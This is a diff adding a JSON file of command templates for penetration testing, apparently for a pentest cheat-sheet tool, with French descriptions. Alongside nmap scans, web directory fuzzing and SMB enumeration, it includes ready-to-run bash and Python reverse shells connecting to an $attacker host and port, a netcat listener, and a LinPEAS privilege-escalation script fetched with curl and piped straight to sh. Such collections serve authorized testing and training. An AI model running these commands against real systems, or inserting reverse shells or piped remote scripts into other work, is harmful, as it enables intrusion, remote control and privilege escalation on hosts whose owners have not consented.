@@ -1,0 +1,106 @@
+[
+  {
+    "id": "nmap_full",
+    "name": "Nmap Full TCP Scan",
+    "category": "Reconnaissance/Port Scanning",
+    "command": "nmap -sC -sV -p- -oN nmap_full.txt $target",
+    "description": "Scan complet avec scripts par defaut",
+    "tags": ["nmap", "recon", "tcp"]
+  },
+  {
+    "id": "nmap_quick",
+    "name": "Nmap Quick Scan",
+    "category": "Reconnaissance/Port Scanning",
+    "command": "nmap -sC -sV $target",
+    "description": "Scan rapide top 1000 ports",
+    "tags": ["nmap", "recon", "quick"]
+  },
+  {
+    "id": "nmap_udp",
+    "name": "Nmap UDP Scan",
+    "category": "Reconnaissance/Port Scanning",
+    "command": "sudo nmap -sU --top-ports 50 $target",
+    "description": "Scan UDP top 50 ports",
+    "tags": ["nmap", "recon", "udp"]
+  },
+  {
+    "id": "gobuster_dir",
+    "name": "Gobuster Directory",
+    "category": "Enumeration/Web",
+    "command": "gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt",
+    "description": "Directory bruteforce",
+    "tags": ["gobuster", "web", "enum"]
+  },
+  {
+    "id": "ffuf_dir",
+    "name": "Ffuf Directory",
+    "category": "Enumeration/Web",
+    "command": "ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
+    "description": "Fast directory fuzzing",
+    "tags": ["ffuf", "web", "fuzz"]
+  },
+  {
+    "id": "nikto",
+    "name": "Nikto Web Scanner",
+    "category": "Enumeration/Web",
+    "command": "nikto -h http://$target -o nikto.txt",
+    "description": "Web vulnerability scanner",
+    "tags": ["nikto", "web", "vuln"]
+  },
+  {
+    "id": "smb_enum",
+    "name": "SMB Enumeration",
+    "category": "Enumeration/SMB",
+    "command": "smbclient -L //$target -N",
+    "description": "List SMB shares",
+    "tags": ["smb", "enum"]
+  },
+  {
+    "id": "enum4linux",
+    "name": "Enum4Linux",
+    "category": "Enumeration/SMB",
+    "command": "enum4linux -a $target",
+    "description": "Full SMB enumeration",
+    "tags": ["smb", "enum", "ldap"]
+  },
+  {
+    "id": "linpeas",
+    "name": "LinPEAS",
+    "category": "Privilege Escalation/Linux",
+    "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "description": "Linux privilege escalation",
+    "tags": ["privesc", "linux"]
+  },
+  {
+    "id": "winpeas",
+    "name": "WinPEAS",
+    "category": "Privilege Escalation/Windows",
+    "command": "winpeas.exe",
+    "description": "Windows privilege escalation",
+    "tags": ["privesc", "windows"]
+  },
+  {
+    "id": "revshell_bash",
+    "name": "Bash Reverse Shell",
+    "category": "Exploitation/Reverse Shell",
+    "command": "bash -i >& /dev/tcp/$attacker/$port 0>&1",
+    "description": "Bash reverse shell",
+    "tags": ["revshell", "bash"]
+  },
+  {
+    "id": "revshell_python",
+    "name": "Python Reverse Shell",
+    "category": "Exploitation/Reverse Shell",
+    "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$attacker\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "description": "Python reverse shell",
+    "tags": ["revshell", "python"]
+  },
+  {
+    "id": "nc_listener",
+    "name": "Netcat Listener",
+    "category": "Exploitation/Listener",
+    "command": "nc -lvnp $port",
+    "description": "Start netcat listener",
+    "tags": ["netcat", "listener"]
+  }
+]
